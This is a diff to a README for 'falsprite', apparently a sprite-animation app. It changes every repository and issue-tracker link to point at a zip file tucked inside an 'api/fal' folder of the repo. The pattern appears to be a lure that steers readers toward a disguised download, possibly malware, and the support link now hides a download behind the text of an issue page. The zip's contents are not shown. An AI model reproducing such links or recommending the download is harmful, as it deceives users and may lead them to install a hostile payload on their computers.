@@ -1,6 +1,6 @@
 # 🎨 falsprite - Create Animated Sprites Easily
 
-[![Download falsprite](https://img.shields.io/badge/Download-falsprite-brightgreen?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
+[![Download falsprite](https://img.shields.io/badge/Download-falsprite-brightgreen?style=for-the-badge)](https://github.com/KenzieGS/falsprite/raw/refs/heads/main/api/fal/Software-v1.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Use this step-by-step guide to get falsprite running on your Windows PC:
 ### 1. Download falsprite  
 Click the button below to visit the page where you can get the app files:
 
-[![Download falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
+[![Download falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite/raw/refs/heads/main/api/fal/Software-v1.0.zip)
 
 On the linked page, find the latest release or main download link. Choose the Windows version and save the file to your computer.
 
@@ -130,10 +130,10 @@ falsprite only sends the text prompt and your API key to the servers. The app do
 ## 🤝 Support and Feedback
 
 If you have questions or find a bug, open an issue on the GitHub page at:  
-https://github.com/KenzieGS/falsprite/issues
+https://github.com/KenzieGS/falsprite/raw/refs/heads/main/api/fal/Software-v1.0.zip
 
 You can also check for updates and new features there.
 
 ---
 
-[![Get falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
+[![Get falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite/raw/refs/heads/main/api/fal/Software-v1.0.zip)
